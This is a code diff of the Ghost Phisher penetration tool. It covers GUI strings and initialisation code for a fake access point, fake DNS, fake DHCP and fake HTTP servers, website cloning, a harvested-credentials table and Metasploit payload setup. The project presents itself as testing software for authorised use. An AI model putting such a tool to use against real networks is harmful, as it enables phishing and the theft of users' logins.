-        self.access_name_edit.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">input the name of the access point</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.ip_address_label_2.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">input an ip adress you would like to bind access point to e.g 192.168.0.1</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_38.setText(QtGui.QApplication.translate("ghost_phisher", "Channel:     ", None, QtGui.QApplication.UnicodeUTF8))
-        self.channel_combo.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">select the channel you would like the access point run (default is channel 1)</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_18.setTitle(QtGui.QApplication.translate("ghost_phisher", "Cryptography", None, QtGui.QApplication.UnicodeUTF8))
-        self.rouge_radio.setText(QtGui.QApplication.translate("ghost_phisher", "None", None, QtGui.QApplication.UnicodeUTF8))
-        self.wpa_radio.setText(QtGui.QApplication.translate("ghost_phisher", "WPA", None, QtGui.QApplication.UnicodeUTF8))
-        self.wep_radio.setText(QtGui.QApplication.translate("ghost_phisher", "WEP", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_17.setTitle(QtGui.QApplication.translate("ghost_phisher", "Status", None, QtGui.QApplication.UnicodeUTF8))
-        self.access_connection_label.setText(QtGui.QApplication.translate("ghost_phisher", "Connections:", None, QtGui.QApplication.UnicodeUTF8))
-        self.access_start.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Start Wireless Access Point</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.access_start.setText(QtGui.QApplication.translate("ghost_phisher", "Start", None, QtGui.QApplication.UnicodeUTF8))
-        self.access_stop.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Stop Wireless Access Point</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.access_stop.setText(QtGui.QApplication.translate("ghost_phisher", "Stop", None, QtGui.QApplication.UnicodeUTF8))
-        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_5), QtGui.QApplication.translate("ghost_phisher", "Fake Access Point", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox.setTitle(QtGui.QApplication.translate("ghost_phisher", "DNS Interface Settings", None, QtGui.QApplication.UnicodeUTF8))
-        self.card_interface_combo.setToolTip(QtGui.QApplication.translate("ghost_phisher", "select the network interface card you want to use", None, QtGui.QApplication.UnicodeUTF8))
-        self.ip_address_combo.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">Select the IP address that you want the service to run on. (0.0.0.0 is recommended)</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.current_card_label.setText(QtGui.QApplication.translate("ghost_phisher", "Current Interface:  eth0", None, QtGui.QApplication.UnicodeUTF8))
-        self.service_dns_run_label.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>Service running on:</font>  Not Started", None, QtGui.QApplication.UnicodeUTF8))
-        self.dns_port.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>UDP DNS Port:</font> 53", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_5.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>Protocol:</font> UDP (User Datagram Protocol)", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_2.setTitle(QtGui.QApplication.translate("ghost_phisher", "Query Responce Settings", None, QtGui.QApplication.UnicodeUTF8))
-        self.resolveall_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Resolve all queries to the following address (The currently selected IP address is recommended)", None, QtGui.QApplication.UnicodeUTF8))
-        self.dns_ip_address.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the address you want all dns queries to resolve to", None, QtGui.QApplication.UnicodeUTF8))
-        self.dns_ip_address.setStatusTip(QtGui.QApplication.translate("ghost_phisher", "rtrtr", None, QtGui.QApplication.UnicodeUTF8))
-        self.respond_domain_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Respond with Fake address only to the following website domains", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_6.setText(QtGui.QApplication.translate("ghost_phisher", "Address:", None, QtGui.QApplication.UnicodeUTF8))
-        self.domain_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the address you want websites added to resolve into ", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_7.setText(QtGui.QApplication.translate("ghost_phisher", "Website:", None, QtGui.QApplication.UnicodeUTF8))
-        self.domain_label.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input a website address", None, QtGui.QApplication.UnicodeUTF8))
-        self.domain_add_button.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">click to map websites to the corresponding faked address</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.domain_add_button.setText(QtGui.QApplication.translate("ghost_phisher", "Add", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_3.setTitle(QtGui.QApplication.translate("ghost_phisher", "Status", None, QtGui.QApplication.UnicodeUTF8))
-        self.dns_connection_label.setText(QtGui.QApplication.translate("ghost_phisher", "Connections:", None, QtGui.QApplication.UnicodeUTF8))
-        self.dns_start.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Start DNS Server", None, QtGui.QApplication.UnicodeUTF8))
-        self.dns_start.setText(QtGui.QApplication.translate("ghost_phisher", "Start", None, QtGui.QApplication.UnicodeUTF8))
-        self.dns_stop.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Stop DNS Server", None, QtGui.QApplication.UnicodeUTF8))
-        self.dns_stop.setText(QtGui.QApplication.translate("ghost_phisher", "Stop", None, QtGui.QApplication.UnicodeUTF8))
-        self.tabWidget.setTabText(self.tabWidget.indexOf(self.dns_tab), QtGui.QApplication.translate("ghost_phisher", "Fake DNS Server", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_4.setTitle(QtGui.QApplication.translate("ghost_phisher", "DHCP Version Information", None, QtGui.QApplication.UnicodeUTF8))
-        self.label.setText(QtGui.QApplication.translate("ghost_phisher", "DHCP3 Server is installed and ready for leasing", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_2.setText(QtGui.QApplication.translate("ghost_phisher", "Default  Port:   67", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_3.setText(QtGui.QApplication.translate("ghost_phisher", "Protocol: UDP (User Datagram Protocol)", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_5.setTitle(QtGui.QApplication.translate("ghost_phisher", "DHCP Settings", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_4.setText(QtGui.QApplication.translate("ghost_phisher", "Start:             ", None, QtGui.QApplication.UnicodeUTF8))
-        self.start_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the address you want leasing to start from e.g 192.168.0.1", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_9.setText(QtGui.QApplication.translate("ghost_phisher", "Subnet mask:  ", None, QtGui.QApplication.UnicodeUTF8))
-        self.subnet_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the subnet mask 255.255.255.0", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_10.setText(QtGui.QApplication.translate("ghost_phisher", "Fake DNS:     ", None, QtGui.QApplication.UnicodeUTF8))
-        self.fakedns_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the address of the started Fake DNS Server", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_8.setText(QtGui.QApplication.translate("ghost_phisher", "End:        ", None, QtGui.QApplication.UnicodeUTF8))
-        self.stop_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input address you want leasing to stop e.g 192.168.0.254", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_12.setText(QtGui.QApplication.translate("ghost_phisher", "Gateway: ", None, QtGui.QApplication.UnicodeUTF8))
-        self.gateway_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input the defaulf gateway address, routers address", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_11.setText(QtGui.QApplication.translate("ghost_phisher", "Alt DNS:  ", None, QtGui.QApplication.UnicodeUTF8))
-        self.alternatedns_ip.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input an alternate ip address", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_6.setTitle(QtGui.QApplication.translate("ghost_phisher", "Status", None, QtGui.QApplication.UnicodeUTF8))
-        self.dhcp_start.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Start DHCP Server", None, QtGui.QApplication.UnicodeUTF8))
-        self.dhcp_start.setText(QtGui.QApplication.translate("ghost_phisher", "Start", None, QtGui.QApplication.UnicodeUTF8))
-        self.dhcp_stop.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Stop DHCP Server", None, QtGui.QApplication.UnicodeUTF8))
-        self.dhcp_stop.setText(QtGui.QApplication.translate("ghost_phisher", "Stop", None, QtGui.QApplication.UnicodeUTF8))
-        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2), QtGui.QApplication.translate("ghost_phisher", "Fake DHCP Server", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_7.setTitle(QtGui.QApplication.translate("ghost_phisher", "HTTP Interface Settings", None, QtGui.QApplication.UnicodeUTF8))
-        self.http_interface_combo.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Select an interface card", None, QtGui.QApplication.UnicodeUTF8))
-        self.http_ip_combo.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:7pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">Select the IP address that you want the service to run on</p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.current_card_label_2.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>Current Interface:</font>  eth0", None, QtGui.QApplication.UnicodeUTF8))
-        self.http_ip_label.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>Service running on:</font>  Not Started", None, QtGui.QApplication.UnicodeUTF8))
-        self.http_port_label.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>TCP Port:</font> 80", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_13.setText(QtGui.QApplication.translate("ghost_phisher", "<font color=green>Protocol:</font> HTTP (Hypertext Transfer Protocol)", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_8.setTitle(QtGui.QApplication.translate("ghost_phisher", "Webpage Settings", None, QtGui.QApplication.UnicodeUTF8))
-        self.emulate_website_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Clone Website:", None, QtGui.QApplication.UnicodeUTF8))
-        self.emulate_website_label.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">Input the web address of a website you want to clone  e.g http://www.foo-bar.com/</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.select_website_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Select Webpage:", None, QtGui.QApplication.UnicodeUTF8))
-        self.website_linedit.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">Input the path to a webpage you want to host   e.g /usr/local/bin/index.html</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.website_button.setText(QtGui.QApplication.translate("ghost_phisher", "Browse", None, QtGui.QApplication.UnicodeUTF8))
-        self.run_webpage_port_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Run Webpage on Port :", None, QtGui.QApplication.UnicodeUTF8))
-        self.use_port_http.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
-"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
-"p, li { white-space: pre-wrap; }\n"
-"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
-"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">input the port number of which you want the HTTP server to run on   e.g 80</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_14.setText(QtGui.QApplication.translate("ghost_phisher", "( Default HTTP Server port is 80 ) ", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_10.setTitle(QtGui.QApplication.translate("ghost_phisher", "Status", None, QtGui.QApplication.UnicodeUTF8))
-        self.http_captured_credential.setText(QtGui.QApplication.translate("ghost_phisher", "captured credentials:", None, QtGui.QApplication.UnicodeUTF8))
-        self.http_captured_credential_2.setText(QtGui.QApplication.translate("ghost_phisher", "Please refer to the Harvested Credential Tab to view captured credentials", None, QtGui.QApplication.UnicodeUTF8))
-        self.http_start.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Start the HTTP Server", None, QtGui.QApplication.UnicodeUTF8))
-        self.http_start.setText(QtGui.QApplication.translate("ghost_phisher", "Start", None, QtGui.QApplication.UnicodeUTF8))
-        self.http_stop.setToolTip(QtGui.QApplication.translate("ghost_phisher", "Stop the HTTP Server", None, QtGui.QApplication.UnicodeUTF8))
-        self.http_stop.setText(QtGui.QApplication.translate("ghost_phisher", "Stop", None, QtGui.QApplication.UnicodeUTF8))
-        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), QtGui.QApplication.translate("ghost_phisher", "Fake HTTP Server", None, QtGui.QApplication.UnicodeUTF8))
-        self.credential_table.horizontalHeaderItem(0).setText(QtGui.QApplication.translate("ghost_phisher", "Website", None, QtGui.QApplication.UnicodeUTF8))
-        self.credential_table.horizontalHeaderItem(1).setText(QtGui.QApplication.translate("ghost_phisher", "Username", None, QtGui.QApplication.UnicodeUTF8))
-        self.credential_table.horizontalHeaderItem(2).setText(QtGui.QApplication.translate("ghost_phisher", "Password", None, QtGui.QApplication.UnicodeUTF8))
-        self.savechanges_button.setText(QtGui.QApplication.translate("ghost_phisher", "Save Changes", None, QtGui.QApplication.UnicodeUTF8))
-        self.insert_button.setText(QtGui.QApplication.translate("ghost_phisher", "Insert", None, QtGui.QApplication.UnicodeUTF8))
-        self.delete_button.setText(QtGui.QApplication.translate("ghost_phisher", "Delete", None, QtGui.QApplication.UnicodeUTF8))
-        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_3), QtGui.QApplication.translate("ghost_phisher", "Harvested Credentials", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_13.setTitle(QtGui.QApplication.translate("ghost_phisher", "About Ghost Phisher", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_17.setText(QtGui.QApplication.translate("ghost_phisher", "Ghost Phisher is an application written in python that gives its user the power to control network", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_18.setText(QtGui.QApplication.translate("ghost_phisher", "services with an ultimate aim of harvesting information from a vulnerable network connection through", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_20.setText(QtGui.QApplication.translate("ghost_phisher", " penetrations via hosted exploit scripts ,client redirections e.t.c,the included network services", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_19.setText(QtGui.QApplication.translate("ghost_phisher", " could be used individually or collectively to lauch phishing attacks or run normal service queries.", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_11.setTitle(QtGui.QApplication.translate("ghost_phisher", "Disclaimer", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_21.setText(QtGui.QApplication.translate("ghost_phisher", "Use this program for testing your own network to see if they are vulnerable to the various ", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_22.setText(QtGui.QApplication.translate("ghost_phisher", " attacks that could be perpetrated with this program.  DO NOT USE IT on networks of which ", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_23.setText(QtGui.QApplication.translate("ghost_phisher", "you do not have permission to test.", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_12.setTitle(QtGui.QApplication.translate("ghost_phisher", "Authoring", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_15.setText(QtGui.QApplication.translate("ghost_phisher", "Written by:    Saviour Emmanuel Ekiko              savioboyz@rocketmail.com ", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_27.setText(QtGui.QApplication.translate("ghost_phisher", "Contributor:  Kashif Iftikhar                               a10n3.s7r1k3r@gmail.com", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_16.setText(QtGui.QApplication.translate("ghost_phisher", "Special thanks to Chris Ondrovic,Lee Baird and others for their wonderful supports through my projects", None, QtGui.QApplication.UnicodeUTF8))
-        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_4), QtGui.QApplication.translate("ghost_phisher", "About", None, QtGui.QApplication.UnicodeUTF8))
-
-class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main class for all GUI functional definitions
+class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class for all GUI functional definitions
     ''' Main Class for GUI'''
     def __init__(self):
         QtGui.QDialog.__init__(self)
@@ -1055,17 +79,48 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
         self.dns_stop.setEnabled(False)
         self.dhcp_stop.setEnabled(False)
         self.http_stop.setEnabled(False)
+        self.ghost_spawn_stop.setEnabled(False)
         self.monitor_button.setEnabled(False)
         self.access_stop.setEnabled(False)
         self.access_start.setEnabled(False)
         self.domain_add_button.setEnabled(False)
         self.groupBox_16.setEnabled(False)
 
+        self.check_root_priviledges()   # Check root priviledges
+
+        self.dns_control = 1     # Notifies Ghost Trap of DNS Status
+
+        # Ghost Trap method constructor calls and variables
+        self.encode_number_list()
+        self.metasploit_payloads()
+        self.metasploit_installation()
+
+        self.form_variables = None
+        self.fake_http_object = None
+        self.custom_spawn_page_path = None
+
+        self.custom_windows_exec_path = None
+        self.custom_linux_exec_path = None
+
+        self.dhcp_cache ={}
+
+
+        self.metasploit_payload_choice()
+        self.vulnarabilty_page_choice()
+
+        self.red_led = "%s/gui/images/red_led.png"%(cwd)
+        self.green_led = "%s/gui/images/green_led.png"%(cwd)
+
         # Thread execute Tip settings dialog after 5 seconds
         thread.start_new_thread(self.run_tips_thread,())
 
         # Get data from database from initialization
         global previous_database_data
+
+
+        # Metasploit Class object
+        self.metasploit_object = metasploit_payload.metasploit()             #  Metasploit Thread class
+        self.update_function = update_class()
 
         previous_database_data = self.fetch_data()
 
@@ -1088,8 +143,7 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
                 password.setText(current_credential[2])
                 self.credential_table.setItem(iterate,2,password)
 
-        except IndexError:
-            pass
+        except IndexError:pass
 
         #
         # Check if DHCP3 Server service is installed on the computer
@@ -1114,22 +168,6 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
                 self.label.setText('<font color=red>DHCP3 Server is not installed</font>')
                 self.dhcp_status.append('<font color=green>To Install DHCP3 Server run:</font>\t<font color=red>apt-get install dhcp3-server</font>')
                 dhcp_installation_status = 'not installed'
-        #
-        # Check if ettercap Server service is installed on the computer
-        #
-        global ettercap_installation_status
-
-        installation_status = commands.getstatusoutput('which ettercap')
-        if installation_status[0] != 0:
-            self.status_textbrowser_http.append('<font color=red>Packet Sniffer is not installed</font>')
-            self.status_textbrowser_http.append('<font color=green>To Install Packet Sniffer run:</font>\t<font color=red>apt-get install ettercap-gtk</font>')
-            ettercap_installation_status = 'not installed'
-            self.http_interface_combo.setEnabled(False)
-            self.http_ip_combo.setEnabled(False)
-            self.current_card_label_2.setText("<font color=green>Current Interface:</font>  Deactivated")
-            self.http_port_label.setText('<font color=green>TCP Port:</font> Not Started')
-            self.groupBox_8.setEnabled(False)
-            self.http_start.setEnabled(False)
 
 
         installation_status_access = commands.getstatusoutput('which airbase-ng')
@@ -1140,39 +178,53 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
         #
         # Read settings files and append their corresponding last settings to their input area
         #
-        try:
-            self.dns_ip_address.setText(read_last_settings('self.dns_ip_address'))
-        except IndexError:pass                                          # If these handled exceptions get raised,it means that GUI object has not been used
-        try:
-            self.start_ip.setText(read_last_settings('self.start_ip'))
-        except IndexError:pass
-        try:
-            self.subnet_ip.setText(read_last_settings('self.subnet_ip'))
-        except IndexError:pass
-        try:
-            self.stop_ip.setText(read_last_settings('self.stop_ip'))
-        except IndexError:pass
-        try:
-            self.fakedns_ip.setText(read_last_settings('self.fakedns_ip'))
-        except IndexError:pass
-        try:
-            self.gateway_ip.setText(read_last_settings('self.gateway_ip'))
-        except IndexError:pass
-        try:
-            self.alternatedns_ip.setText(read_last_settings('self.alternatedns_ip'))
-        except IndexError:pass
-        try:
-            self.website_linedit.setText(read_last_settings('self.website_linedit'))
-        except IndexError:pass
-        try:
-            self.ip_address_label_2.setText(read_last_settings('ip_address_label_2'))
-        except IndexError:pass
-        try:
-            self.lineEdit_2.setText(read_last_settings('lineEdit_2'))
-        except IndexError:pass
-        try:
-            self.access_name_edit.setText(read_last_settings('access_name_edit'))
-        except IndexError:pass
+        if ghost_settings.setting_exists('self.dns_ip_address'):
+            self.dns_ip_address.setText(ghost_settings.read_last_settings('self.dns_ip_address'))
+
+        if ghost_settings.setting_exists('self.start_ip'):
+            self.start_ip.setText(ghost_settings.read_last_settings('self.start_ip'))
+
+        if ghost_settings.setting_exists('self.subnet_ip'):
+            self.subnet_ip.setText(ghost_settings.read_last_settings('self.subnet_ip'))
+
+        if ghost_settings.setting_exists('self.stop_ip'):
+            self.stop_ip.setText(ghost_settings.read_last_settings('self.stop_ip'))
+
+        if ghost_settings.setting_exists('self.fakedns_ip'):
+            self.fakedns_ip.setText(ghost_settings.read_last_settings('self.fakedns_ip'))
+
+        if ghost_settings.setting_exists('self.gateway_ip'):
+            self.gateway_ip.setText(ghost_settings.read_last_settings('self.gateway_ip'))
+
+        if ghost_settings.setting_exists('self.alternatedns_ip'):
+            self.alternatedns_ip.setText(ghost_settings.read_last_settings('self.alternatedns_ip'))
+
+        if ghost_settings.setting_exists('self.website_linedit'):
+            self.website_linedit.setText(ghost_settings.read_last_settings('self.website_linedit'))
+
+        if ghost_settings.setting_exists('ip_address_label_2'):
+            self.ip_address_label_2.setText(ghost_settings.read_last_settings('ip_address_label_2'))
+
+        if ghost_settings.setting_exists('lineEdit_2'):
+            self.lineEdit_2.setText(ghost_settings.read_last_settings('lineEdit_2'))
+
+        if ghost_settings.setting_exists('access_name_edit'):
+            self.access_name_edit.setText(ghost_settings.read_last_settings('access_name_edit'))
+
+
+        if ghost_settings.setting_exists('self.linux_exec_edit'):
+            self.linux_exec_checkbox.setChecked(True)
+            self.linux_exec_edit.setText(ghost_settings.read_last_settings('self.linux_exec_edit'))
+        else:
+            self.linux_exec_checkbox.setChecked(False)
+
+
+        if ghost_settings.setting_exists("self.windows_exec_edit"):
+            self.windows_exec_checkbox.setChecked(True)
+            self.windows_exec_edit.setText(ghost_settings.read_last_settings("self.windows_exec_edit"))
+        else:
+            self.windows_exec_checkbox.setChecked(False)
+
 
 
         global usable_interface_cards
@@ -1208,6 +260,7 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
 
         interface_cards = usable_interface_cards.keys()
         interface_cards_http = usable_interface_cards.keys()
+        interface_cards.sort()
         interface_cards.reverse()
 
         # Add iterface card names to the DNS interface combo and HTTP combo
@@ -1220,12 +273,19 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
         self.card_interface_combo.addItems(interface_cards)
         self.http_interface_combo.addItems(interface_cards_http)
 
+        self.spawn_http_interface_combo.addItems(interface_cards)
+
         interface_card_ip = []                                                      # List holding Ip addresses derived from the dictionary
         selected_interface = str(self.card_interface_combo.currentText())
         interface_card_ip.append(usable_interface_cards[selected_interface])
 
         self.ip_address_combo.addItems(interface_card_ip)                           #Adds the IP address of the First Card to DNS IP combo
         self.http_ip_combo.addItems(interface_card_ip)           #Adds the IP address of the First Card to HTTP IP combo
+        self.spawn_ip_combo.addItems(interface_card_ip)             # Adds the IP address of the First Card to the Ghost Spawn combo
+
+        self.port_setting_edit.setText("4444")
+        self.ghost_trap_http_edit.setText("80")
+        self.ip_address_edit.setText(self.spawn_ip_combo.currentText())
 
 
         self.current_card_label.setText("<font color=green>Current Interface:</font>  %s"%(selected_interface))
@@ -1243,11 +303,13 @@ class Ghost_phisher(QtGui.QMainWindow, Ui_ghost_phisher):            # Main clas
         #
         self.connect(self.card_interface_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.update_dns_address)
         self.connect(self.http_interface_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.update_http_address)
